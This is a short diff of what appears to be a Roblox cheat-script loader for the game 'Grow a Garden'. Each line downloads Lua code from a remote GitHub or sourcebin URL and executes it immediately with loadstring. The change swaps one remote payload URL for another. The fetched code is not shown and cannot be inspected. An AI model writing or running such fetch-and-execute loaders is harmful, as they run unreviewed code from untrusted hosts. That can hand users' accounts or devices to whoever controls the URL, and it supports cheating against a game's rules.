@@ -1,2 +1,2 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/growagardenv1/levelup/refs/heads/main/message%20(2).txt"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/growagardenv1/latest/refs/heads/main/growagardenv5"))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/qJhVv7gAbK/0", true))()
